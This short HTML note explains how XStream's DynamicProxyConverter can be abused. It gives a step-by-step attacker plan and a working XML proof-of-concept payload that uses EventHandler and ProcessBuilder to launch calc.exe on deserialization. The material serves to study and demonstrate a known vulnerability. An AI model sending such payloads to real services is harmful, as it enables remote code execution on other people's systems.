<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>DynamicProxyConverter</title>
</head><body>DynamicProxyConverter<br/>
Any dynamic proxy generated by java.lang.reflect.Proxy. The dynamic proxy itself is not serialized; however, the interfaces it implements and the actual InvocatinoHandler instance are serialized. This allows the proxy to be reconstructed after deserialization. <br/>
<br/>
<img src="image.png" /><br/>
<br/>
Attacker’s plan:<ul><li style="list-style-type: none">•Find out what Class the XML will be deserialized to</li>
<li style="list-style-type: none">•Create a proxy for that Class the WebService is waiting for</li>
<li style="list-style-type: none">•Intercept/hook any call to any method in the interface</li>
<li style="list-style-type: none">•Replace the original call with the malicious payload </li>
<li style="list-style-type: none">•Send the serialized version of the proxy</li>
<li style="list-style-type: none">•Cross-fingers</li>
<li style="list-style-type: none">•Profit</li>
<li style="list-style-type: none"></li>
</ul>
&lt;dynamic-proxy&gt;<br/>
&lt;interface&gt;org.company.model.Contact&lt;/interface&gt;<br/>
&lt;handler class="java.beans.EventHandler"&gt;<br/>
&nbsp; &nbsp; &lt;target class="java.lang.ProcessBuilder"&gt;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &lt;command&gt;&lt;string&gt;calc.exe&lt;/string&gt;&lt;/command&gt;<br/>
&nbsp; &nbsp; &lt;/target&gt;<br/>
&nbsp; &nbsp; &lt;action&gt;start&lt;/action&gt;<br/>
&lt;/handler&gt;<br/>
&lt;/dynamic-proxy&gt;</body></html>